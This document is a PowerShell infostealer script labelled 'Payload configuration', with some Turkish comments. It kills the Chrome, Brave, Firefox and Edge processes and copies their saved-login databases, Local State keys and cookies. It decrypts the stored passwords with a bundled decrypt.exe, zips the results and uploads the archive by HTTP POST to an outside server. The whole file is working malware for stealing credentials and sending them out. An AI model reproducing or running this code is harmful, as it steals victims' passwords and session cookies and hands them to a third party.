#-- Payload configuration --#

# Set destination directory directly to AppData
$destDir = "$env:APPDATA\BrowserData"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir
}

# Function to copy browser files
function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
    if (-Not (Test-Path $browserDestDir)) {
        New-Item -ItemType Directory -Path $browserDestDir
    }

    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDir -ChildPath $file
        if (Test-Path $source) {
            Copy-Item -Path $source -Destination $browserDestDir
            Write-Host "$browserName - File copied: $file"
        } else {
            Write-Host "$browserName - File not found: $file"
        }
    }
}

# Function to kill browser processes
function KillBrowserProcesses($browserName) {
    $processes = Get-Process | Where-Object { $_.Name -like "*$browserName*" }
    foreach ($process in $processes) {
        Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
        Write-Host "Killing process: $browserName with ID: $($process.Id)"
    }
}

# Configuration for Google Chrome
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeFilesToCopy = @("Login Data")
$localStateChrome = Join-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -ChildPath "Local State"
KillBrowserProcesses "chrome"
CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
Copy-Item -Path $localStateChrome -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue
Write-Host "Chrome - Local State file copied."

# Configuration for Brave
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
$braveFilesToCopy = @("Login Data")
$localStateBrave = Join-Path -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" -ChildPath "Local State"
KillBrowserProcesses "brave"
CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
Copy-Item -Path $localStateBrave -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue
Write-Host "Brave - Local State file copied."

# Configuration for Firefox
$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
$firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-release" | Select-Object -First 1
if ($firefoxProfile) {
    $firefoxDir = $firefoxProfile.FullName
    $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
    KillBrowserProcesses "firefox"
    CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
} else {
    Write-Host "Firefox - No profile found."
}

# Configuration for Microsoft Edge
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$edgeFilesToCopy = @("Login Data")
$localStateEdge = Join-Path -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -ChildPath "Local State"
KillBrowserProcesses "msedge"
CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
Copy-Item -Path $localStateEdge -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue
Write-Host "Edge - Local State file copied."

# Decrypt the copied Login Data files using decrypt.exe
$decryptExePath = Join-Path -Path "$destDir\Chrome" -ChildPath "decrypt.exe"
$loginDataPath = Join-Path -Path "$destDir\Chrome" -ChildPath "Login Data"
$localStatePath = Join-Path -Path "$destDir\Chrome" -ChildPath "Local State"

# Output path for decrypted passwords
$outputPath = Join-Path -Path $destDir -ChildPath "output.txt"

# Separate Test-Path checks
if (Test-Path $decryptExePath) {
    if (Test-Path $loginDataPath) {
        if (Test-Path $localStatePath) {
            # Run the decrypt.exe with specified parameters and capture output
            $result = & $decryptExePath $loginDataPath $localStatePath $outputPath 2>&1
            Write-Host "Decrypt.exe output: $result"  # Write the output for debugging
            
            if (Test-Path $outputPath) {
                Write-Host "Decrypted passwords saved to: $outputPath"
            } else {
                Write-Host "Decrypted passwords not found."
            }

            # Delete decrypt.exe after use
            try {
                Remove-Item $decryptExePath -Force -ErrorAction Stop
                Write-Host "decrypt.exe deleted to reduce ZIP size."
            } catch {
                Write-Host "decrypt.exe could not be deleted: $_"
            }
        } else {
            Write-Host "Local State not found."
        }
    } else {
        Write-Host "Login Data not found."
    }
} else {
    Write-Host "Decrypt.exe not found."
}

# Klasörü ZIP dosyasına sıkıştırma
$zipDir = "$env:APPDATA\ZippedBrowserData"
if (-Not (Test-Path $zipDir)) {
    New-Item -ItemType Directory -Path $zipDir
}

# Sıkıştırmak istediğiniz klasörün yolu
$folderPath = $destDir

# ZIP dosyasının hedef yolu
$zipFilePath = Join-Path -Path $zipDir -ChildPath "BrowserData.zip"

# Eğer ZIP dosyası zaten varsa, sil
if (Test-Path $zipFilePath) {
    Remove-Item $zipFilePath -Force
}

# Klasörü ZIP dosyasına sıkıştırma
Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath

# Yüklemek istediğiniz dosyanın yolu
$zipFilePath = "$env:APPDATA\ZippedBrowserData\BrowserData.zip"  # ZIP dosyasının tam yolu
$url = "https://alperen.cc/uploadd.php"  # PHP dosya yükleme URL'si

if (Test-Path $zipFilePath) {
    try {
        # Multipart form-data boundary oluşturma
        $boundary = [System.Guid]::NewGuid().ToString("N")
        $contentType = "multipart/form-data; boundary=$boundary"

        # Form data başlıkları
        $fileName = [System.IO.Path]::GetFileName($zipFilePath)
        $header = "--$boundary`r`nContent-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`"`r`nContent-Type: application/zip`r`n`r`n"
        $footer = "`r`n--$boundary--`r`n"

        # Dosya içeriğini oku (binary olarak)
        $fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)

        # Body oluşturma
        $bodyStream = New-Object System.IO.MemoryStream
        $writer = New-Object System.IO.StreamWriter $bodyStream
        $writer.Write($header)
        $writer.Flush()

        # Binary dosyayı ekleme
        $bodyStream.Write($fileBytes, 0, $fileBytes.Length)
        $writer.Flush()

        # Footer ekle
        $writer.Write($footer)
        $writer.Flush()

        # Body'yi byte array olarak oku
        $bodyStream.Position = 0
        $bodyBytes = $bodyStream.ToArray()

        # POST isteğini gönder
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $bodyBytes -ContentType $contentType -ErrorAction Stop

        # Yanıtı göster
        Write-Output $response

        # Temizlik
        $writer.Dispose()
        $bodyStream.Dispose()
    } catch {
        Write-Host "Dosya yüklenirken bir hata oluştu: $_. Exception: $($_.Exception.Message)"
    }
} else {
    Write-Host "ZIP dosyası bulunamadı: $zipFilePath"
}
